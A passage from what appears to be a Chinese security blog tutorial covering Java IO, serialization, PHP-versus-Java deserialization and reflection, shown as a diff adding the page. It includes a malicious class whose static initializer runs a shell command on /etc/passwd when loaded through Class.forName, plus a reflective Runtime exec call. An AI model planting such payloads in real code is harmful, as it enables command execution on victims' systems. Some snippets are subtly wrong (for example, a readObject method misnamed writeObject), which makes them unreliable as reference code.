@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="CTF,Java,Web,JavaScript,Linux">
+    <meta name="description" content="记录一些奇奇怪怪乱七八糟的东西">
+    <meta name="author" content="y1zh3e7">
+    
+    <title>
+        
+            Java安全反序列化预备全知 |
+        
+        y1’s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.jpg","favicon":"/images/logo.jpg","avatar":"/images/avatar.jpg","font_size":"21px","font_family":"STHeiti","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/cover.jpg","description":"一只坐牢的web🐶 || 懂进攻知防守，先正向后逆向","font_color":"#FFFFFF","hitokoto":false},"scroll":{"progress_bar":true,"percent":true}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"yCemvr5nGXrJlWRCN3SLWLLy-MdYXbMMI","appkey":"7gIuYJ9YQk94en6wRudankYd","server_urls":"https://ycemvr5n.api.lncldglobal.com","placeholder":"Hi speak something！"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"center","copyright_info":false},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.0.0-rc1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.jpg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               y1’s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java安全反序列化预备全知</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">y1zh3e7</span>
+                            
+                                <span class="author-label">Lv1</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-04-21 10:13:57</span>
+        <span class="mobile">2023-04-21 10:13</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-04-21 10:14:55</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/WebSec/">WebSec</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java反序列化</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>7.8k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>30 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Java原生序列化-反序列化"><a href="#Java原生序列化-反序列化" class="headerlink" title="Java原生序列化/反序列化"></a>Java原生序列化/反序列化</h1><h1 id="Java反序列化入门篇"><a href="#Java反序列化入门篇" class="headerlink" title="Java反序列化入门篇"></a><strong>Java反序列化入门篇</strong></h1><h2 id="Java-IO"><a href="#Java-IO" class="headerlink" title="Java IO"></a><strong>Java IO</strong></h2><p>在学习Java反序列化之前我们先要了解一下Java的输入输出流：</p>
+<p>java的IO流分为了<strong>文件IO流（FileInput/OutputStream）和对象IO流（ObjectInput/OutputStream）</strong>，从名字上就可以看出来一个是用来对文件进行输入和输出，一个是对对象进行输入和输出。</p>
+<p>流的传输过程：</p>
+<p>首先不管是输入还是输出，传输的两端都是文件和java的运行程序，所以如果想要在这二者之间进行传输，我们就需要将他们两个之间搭起来一个可以传输的通道，这样就可以实现流的传输。</p>
+<ul>
+<li>输出流（OutputStream）：</li>
+</ul>
+<p>如果我们想对一个文件进行写入操作，那么实质上是在java程序中将流（想要写入的内容）输出到目的文件中，所以流的方向是从java输出到文件，举个对文件写入一个对象的例子：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("filename"));</span><br><span class="line">oos.writeObject(obj);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>首先用<code>new FileOutputStream</code>创建一个文件输出流，再用<code>new ObjectOutputStream</code>创建一个对象输出流（因为oos是对象输出流类型），这时我们就可以在java程序中向外（文件）输出流（内容）了，画成图大概是这样：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209271524379.jpg"></p>
+<p>当我们要给这个文件传一个obj对象时，就会从java程序顺着这条通道进入到file中。</p>
+<ul>
+<li>输入流（InputStream）</li>
+</ul>
+<p>其实输入流和输出流构建出传输通道的方法几乎是一样的，区别就是流的输出方向是从file指向了java程序，所以如果想要read这个文件我们就要用输入流将file输入到java程序中进行读取。</p>
+<h2 id="Java序列化和反序列化的过程"><a href="#Java序列化和反序列化的过程" class="headerlink" title="Java序列化和反序列化的过程"></a><strong>Java序列化和反序列化的过程</strong></h2><p>首先为什么要进行序列化和反序列化，在程序运行结束后，这个程序里的对象都会被删除，并且对象的构成很复杂，传输起来非常不方便。如果我们想要让某些对象持久的保存下来并利于传输，我们就可以将这些对象进行序列化成一串数据，保存在某个地方，在需要用到这个对象时再反序列化让这一串数据还原成一个对象。看到一个很生动的比喻，想把一张桌子搬进门里，如果不能通过，我们就可以将这个桌子拆开（序列化），在搬进去之后再将桌子组装回去（序列化），这就是序列化和反序列化。</p>
+<p>与php反序列化不同的是php序列化和反序列化提供了关键字<code>serialize和unserialize</code>，但java并没有这种api，我们刚才提到了Java的IO，那么它和Java的序列化和反序列化之间有什么关系呢，我们刚才说序列化就是将对象转换为一串字节数据并保存起来，那么这个过程的实现其实就是依靠java的输出，将这个对象从java程序里以字节数据流的形式输出到java的外部，相对的反序列化其实就是依靠java的输入，将java外的字节数据流输入到java程序中，最终经过一些处理还原为对象。也就是说java中的序列化和反序列化是需要开发人员自己写出整个过程。这里提供两段使用javaIO进行序列化和反序列化的代码（如果要完成整个序列化和反序列化的过程，还需要其他方法参与构建，如readObject和writeObject，下面会提到），假设ser.bin是我们用来储存序列化后字节数据流的文件：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/** 要序列化和反序列化的类 **/</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable {</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Person(){</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">    // 构造函数</span><br><span class="line">    public Person(String name, int age){</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString(){</span><br><span class="line">        return "Person{" +</span><br><span class="line">                "name='" + name + '\\'' +</span><br><span class="line">                ", age=" + age +</span><br><span class="line">                '}';</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/** 序列化 **/</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutput;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line">public class SerializationTest {</span><br><span class="line">    public static void serialize(Object obj) throws IOException{</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        Person person = new Person("aa",22);</span><br><span class="line">        System.out.println(person);</span><br><span class="line">        serialize(person);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/** 反序列化 **/</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class UnserializeTest {</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception{</span><br><span class="line">        Person person = (Person)unserialize("ser.bin");</span><br><span class="line">        System.out.println(person);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出后可以发现在序列化之前输出对象person和在反序列化后输出都调用了<code>__toString</code>，成功构造了序列化和反序列化。</p>
+<h2 id="php和Java反序列化之间的区别"><a href="#php和Java反序列化之间的区别" class="headerlink" title="php和Java反序列化之间的区别"></a><strong>php和Java反序列化之间的区别</strong></h2><p>在php的序列化和反序列化中提供了serialize和unserialize函数，可以直接将对象序列化为一串数据或直接将一串数据反序列化为一个对象，程序员在这个过程中是无法参与的，但在Java中，需要程序员自己来构建序列化和反序列化的过程，php在反序列化时会自动触发<code>__wakeup</code>函数，java在反序列化时会自动触发<code>readObject</code>方法，虽然都是在反序列化时触发，但二者之间有一些细微的差别。</p>
+<p>php反序列化（对一个数据库链接对象反序列化）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Connection</span><br><span class="line">{</span><br><span class="line">    protected $link;</span><br><span class="line">    private $dsn, $username, $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($dsn, $username, $password)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;dsn = dsn;</span><br><span class="line">        $this-&gt;username = username;</span><br><span class="line">        $this-&gt;password = password;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private function connect()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们直接输出序列化后的这个Connection类的对象，发现输出为null，那么在反序列化时也是null，因为在php中资源类型的对象默认不会写入序列化数据中。</p>
+<p>如果我们将代码改成下面这样就可以在序列化后在<code>$link</code>中拿到一个数据库连接了：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Connection</span><br><span class="line">{</span><br><span class="line">    protected $link;</span><br><span class="line">    private $dsn, $username, $password;</span><br><span class="line"></span><br><span class="line">    public function __construct($dsn, $username, $password)</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;dsn = dsn;</span><br><span class="line">        $this-&gt;username = username;</span><br><span class="line">        $this-&gt;password = password;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private function connect()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;link = new PDO($this-&gt;dsn, $this-&gt;username, $this-&gt;password);</span><br><span class="line">    }</span><br><span class="line">    public function __sleep()</span><br><span class="line">    {</span><br><span class="line">            return array('dsn', 'username', 'password');</span><br><span class="line">    }</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    {</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>Connection的对象被反序列化后调用<code>__wakeup</code>，执行connect函数连接数据库，所以<code>__wakeup</code>的作用其实是反序列化后执行一些初始化操作，但在php中很少利用序列化数据传输资源类型的对象，而其他类型的对象在反序列化的时候已经把值写死了，所以php的反序列化漏洞中很少是由<code>__wakeup</code>这个方法触发的，通常触发在<code>__destruct</code>中。</p>
+<p>Java反序列化：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class Person implements Serializable {</span><br><span class="line"></span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    Person(String name,int age)</span><br><span class="line">    {</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    }</span><br><span class="line">    private void writeObject(java.io.ObjectOutputStream s) throws IOException {</span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line">        s.writeObject("This is a Object");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        String message = (String) s.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在<code>writeObject</code>中，当传入的对象完成了从<code>ObjectOutputStream</code>中继承来的<code>defaultWriteObject</code>后，向流内写入了一个”This is a Object”，因此会在序列化后触发改方法，将字符串写入输出流的对象中，用知识星球里提到的工具SerializationDumper可以看到这个字符串被写到了objectAnnotation位置，在反序列化还原对象时就会将这个字符串输出。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png"></p>
+<p>反序列化的过程是根据开发者的想法来实现的，所以总结一下<code>__wakeup</code>和<code>readObject</code>的不同就是：<code>readObject</code>倾向于解决”反序列化时如何还原一个完整对象”这个问题，而PHP的<code>__wakeup</code>更倾向于解决反序列化后如何初始化这个对象的问题。</p>
+<h1 id="反射-URLDNS"><a href="#反射-URLDNS" class="headerlink" title="反射+URLDNS"></a>反射+URLDNS</h1><h1 id="Java反射篇"><a href="#Java反射篇" class="headerlink" title="Java反射篇"></a><strong>Java反射篇</strong></h1><p>如果我们有一个类，那么我们可以通过实例化该类的对象并调用其中的方法，或者我们也可以直接调用该类中的静态方法，这是我们在一般情况下调用一个方法时的过程，但是在不同的语言中也有不同的方法可以拿到某一个类中的所有内容，在java中我们可以通过“反射”来拿到某一个类中的具体内容 如果把通过new对象并且调用其中的方法的过程叫做“正射”，那么不使用new来创建对象并调用其中方法的过程就叫做“反射”</p>
+<h2 id="反射常用到的方法"><a href="#反射常用到的方法" class="headerlink" title="反射常用到的方法"></a><strong>反射常用到的方法</strong></h2><p>在java的lang包中有一个静态Class类 在java程序运行并编译加载一个类时，java.lang.Class就会实例化出一个对象，这个对象储存该类的所有信息 因此我们可以通过一些方法来获取到这个类的信息 先了解一些方法</p>
+<ul>
+<li><code>Class.forName(classname)</code> 获取classname类中的所有属性包括类名 比如<code>Class clazz = Class.forName("java.lang.Runtime");</code></li>
+</ul>
+<p>那么类clazz中就得到了java.lang.Runtime中的所有属性</p>
+<ul>
+<li><code>Class.newInstance()</code>实例化对象，并触发该类的构造方法 下面会详细解释</li>
+<li><code>Class.getMethod(method name,arg)</code> 获取一个对象中的public方法，由于java支持方法的重载，所以需要第二参数作为获取的方法的形参列表，这样就可以确定获取的是哪一个方法</li>
+<li><code>Method.invoke</code>() 执行方法，如果是一个普通方法，则invoke的第一个参数为该方法所在的对象，如果是静态方法则第一个参数是null或者该方法所在的类 第二个参数为要执行方法的参数</li>
+</ul>
+<p><code>forName</code>并不是唯一获取一个类的方式，其他方式还有：</p>
+<ul>
+<li>obj.getClass() 如果上下文中存在某个类的实例obj，那我们可以直接通过obj.getClass来获取它的类</li>
+<li>Y1.class 如果已经加载了一个类Y1，只是想获取到它由java.lang.class所创造的对象，那么就直接使用这种方法获取即可，这种方法并不属于反射</li>
+<li>Class.Forname 如果知道某个类的名字，想获取到这个类，就可以使用forName来获取</li>
+</ul>
+<h3 id="关于forname"><a href="#关于forname" class="headerlink" title="关于forname"></a><strong>关于forname</strong></h3><p>默认情况下 <code>forName</code>的第一个参数是类名，第二个参数表示是否初始化，第三个参数就是ClassLoader</p>
+<p>ClassLoader是一个“加载器”，告诉java虚拟机如何加载这个类，java默认的ClassLoader就是根据类名加载类，这个类名必须是完整路径，比如上面提到的java.lang.Runtime</p>
+<p>第二个参数<code>initialize</code>用于forname时的初始化，一般我们会认为初始化就是加载类的构造函数，其实并不是，这里提到的初始化有以下过程：</p>
+<p>看下面这个类：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class TrainPrint{</span><br><span class="line">    {</span><br><span class="line">        System.out.printf("Empty block inittial &amp;s\\n", this.getClass());</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    static{</span><br><span class="line">        System.out.printf("Static initial %s\\n", TrainPrint.class);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    public TrainPrint(){</span><br><span class="line">        System.out.printf("Innitial %s\\n", this.getClass());</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这个类中一共有三个代码块 ，在进行初始化时按照以下优先级调用代码块</p>
+<ol>
+<li>static{}</li>
+<li>{}</li>
+<li>构造函数</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png"></p>
+<p>其中，static{}就是在“类初始化”时调用的，而{}中的代码会放在构造函数的<code>super()</code>后面，但在当前构造函数内容的前面</p>
+<p>所以<code>forNmae</code>中的<code>initialize=true</code>其实就是告诉jvm是否执行“类初始化”</p>
+<p>那么 如果有以下方法 其中的参数name可控：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void ref(String name) throws Exception {</span><br><span class="line">		Class.forName(name);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们就可以编写一个恶意类，将恶意代码放置在<code>static{}</code>中，从而执行：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class PayLoad{</span><br><span class="line">    static{</span><br><span class="line">        try{</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = {"touch", "/etc/passwd"};</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line"></span><br><span class="line">        } catch (Exception e){</span><br><span class="line"></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="如何通过反射执行命令"><a href="#如何通过反射执行命令" class="headerlink" title="如何通过反射执行命令"></a><strong>如何通过反射执行命令</strong></h2><p>我们刚才提到，如果想拿到一个类，需要先import才能使用，而使用forname就不需要了，这样我们就可以利用forname加载任意类。</p>
+<p>在java中是支持内部类的，比如我们在普通类 c1中编写内部类c2，在编译时会生成两个文件：c1.class和c1$c2.class，这两个类之间可以看作没有关联，通过<code>Class.forname("c1$c2")</code>即可加载这个内部类，当fastjson在<code>checkAutotype</code>时就会先讲$替换成<code>.</code> 上面说到的<code>$</code>的作用时查找内部类。</p>
+<p>当我们通过反射获取到一个类之后，可以继续通过反射来调用其中的属性和方法，也可以继续实例化这个类，调用其中的方法，也就是用<code>newInstance()</code></p>
+<p>上面提到过newInstance会实例化类，并且触发它的构造方法，所以在一些情况下newInstance是不能成功执行的，比如</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.Runtime");</span><br><span class="line">clazz.getMethod("exec",String.class).invoke(clazz.newInstance(), "id");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png"></p>
